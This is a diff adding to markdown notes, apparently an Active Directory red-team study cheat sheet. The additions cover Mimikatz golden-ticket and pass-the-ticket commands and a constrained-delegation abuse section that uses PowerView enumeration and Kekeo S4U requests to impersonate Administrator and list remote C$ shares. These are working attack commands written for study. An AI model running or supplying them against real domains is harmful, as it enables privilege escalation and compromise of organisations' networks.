@@ -43,6 +43,9 @@
 > 
 > Invoke-Mimkatz -Command '"kerberos::golden /domain:<DOMAINNAMEFQDN> /sid:<Domain SID> /target:<server FQDN> /service:<ServiceName> /rc4:<RC4 NTLM HASH>  /User:Administrator  /ptt"'
 > 
+> Invoke-mimikatz -Command '"kerberos::ptt <TicketFilePAth>"'
+> 
+> 
 > ```
 
 ***Download File***
@@ -311,7 +314,7 @@
 > >
 > > :information_desk_person: A mechanism is required to impersonate the incoming user and authenticate to the second hop server. 
 > >
-> > ***Unconstrained Delegation*** -- Double hopes Kerberos 
+> > :two: :one: ***Unconstrained Delegation*** -- Double hopes Kerberos 
 > >
 > > > :information_desk_person: Allow Access to any service on any computer in the domain 
 > > >
@@ -362,17 +365,76 @@
 > > > > ls \\dcorp-dc.dollarcorp.moneycorp.local\C$
 > > > > ```
 > >
-> > ***Constrained Delegation*** 
+> > :two: :one: ***Constrained Delegation*** 
 > >
 > > > :information_desk_person: Request only to specified services on specified computers;
+> > >
+> > > :bulb: User account is not blocked for delegation 
+> > >
+> > > :bulb: Abuse Condition : Have Access to the Service Account, then it is possible to access the services listed in **msDS-AllowedToDelegateTo** 
 > > >
 > > > :information_source: If the user is not using Kerberos Authentication to authenticate to the first hope server, Window offer protocol transition to transition the request to Kerberos
 > > >
 > > > :book: User authenticates to a web service without Kerberose and the web service makes requests to Database server fetching results based on the user's authorization. 
 > > >
-> > > ***Service for User to Self (S4U2self)*** : Allows Service to obtain a forwarded TGS to its self on behalf a user 
+> > >  ***Service for User to Self (S4U2self)*** : Allows Service to obtain a forwarded TGS to its self on behalf a user with just the user's principal name. 
+> > >
+> > > > :information_desk_person: Service account must have the **TRUSTED_TO_AUTHENTICATED_FOR_DELEGATION** - **T2A4D** UserAccountControlAttribute
 > > >
 > > > ***Service for User to Proxy(S4U2proxy)*** : Allows a service to obtain a TGS to a second service on behalf a user 
+> > >
+> > > > :information_desk_person: This controlled by **msDS-AllowedToDelegateTo** attribute contains a list of SPNs to which user tokens can be forwarded
+> > >
+> > > ***Exploit***
+> > >
+> > > > :one: Enumerate users and computers with constrained delegation enabled 
+> > > >
+> > > > > **Powerview_dev**
+> > > > >
+> > > > > > ```powershell
+> > > > > > Get-DomainUser -TrustedToAuth
+> > > > > > Get-DomainComputer -TrustedToAuth
+> > > > > > ```
+> > > > >
+> > > > > **AD Module**
+> > > > >
+> > > > > > ```powershell
+> > > > > > Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Porperties *
+> > > > > > ```
+> > > >
+> > > > :two: Impersonation 
+> > > >
+> > > > > :information_desk_person: Either PlainText or NTLM hash is required 
+> > > > >
+> > > > > ```powershell
+> > > > > KEko# tgt::ask /user:<ServiceuserNAme> /domain:<domainFQDN> /rc4:<NTLMHash>
+> > > > > 
+> > > > > Keko# tgs::s4u /tgt:<TGTFilePAth> /user:Administrator@<DomainFQDN> /service:<cifs/machinename.DomainFQDN> 
+> > > > > ```
+> > > > >
+> > > > > Inject Ticket to PTT 
+> > > > >
+> > > > > ```powershell
+> > > > > Invoke-mimikatz -Command '"kerberos::ptt <TicketFilePAth>"'
+> > > > > 
+> > > > > klist
+> > > > > 
+> > > > > ls \\MachineName.DomanFQDN\C$
+> > > > > ```
+> > > > >
+> > > > > :bulb: Abuse other services running under same account name is also possible because there is no SPN validation
+> > > > >
+> > > > > :eyes: Having access to a machine NTLM and this machine has AccessDelegation enabled, allows you to compromise the machine 
+> > > > >
+> > > > > ```powershell
+> > > > > KEKO# tgt::ask /user:<machineNAme>$ /domain:<DomainFQDN> /rc4:<MachineNTLMHash>
+> > > > > 
+> > > > > KEKO# tgs::s4u /tgt:<TGTFilePAth> /user:<Administrator@<DomainFQDN> /service:<serviceNAme/DomainFQDN> | <serviceNAme/DomainFQDN> 
+> > > > > ```
+> > > > >
+> > > > > 
+> > > >
+> > > > 
 > >
 > > > 
 > >
